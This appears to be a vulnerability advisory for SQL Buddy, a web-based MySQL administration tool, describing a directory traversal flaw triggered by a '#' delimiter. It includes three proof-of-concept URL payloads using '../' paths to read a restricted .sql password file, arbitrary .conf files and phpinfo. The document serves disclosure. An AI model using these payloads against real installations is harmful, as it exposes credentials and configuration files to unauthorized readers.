Product:
===============================
SQL Buddy is an open source web based MySQL administration application.


Advisory Information:
==============================
sqlbuddy suffers from directory traversal whereby a user can move about
directories an read any PHP and non PHP files by appending
the '#' hash character when requesting files via URLs.

e.g. .doc, .txt, .xml, .conf, .sql etc...

After adding the '#' character as a delimiter any non PHP will be returned
and rendered by subverting the .php concatenation used
by sqlbuddy when requesting PHP pages via POST method.

Normal sqlbuddy request:
http://localhost/sqlbuddy/home.php?ajaxRequest=666&requestKey=<xxxxxxxxxx>


POC exploit payloads:
=======================

1-Read from Apache restricted directory under htdocs:
  http://localhost/sqlbuddy/#page=../../../restricted/user_pwd.sql#

2-Read any arbitrary files that do not have .PHP extensions:
  http://localhost/sqlbuddy/#page=../../../directory/sensitive-file.conf#

3-Read phpinfo (no need for '#' as phpinfo is a PHP file):
  http://localhost/sectest/sqlbuddy/sqlbuddy/#page=../../../../xampp/phpinfo
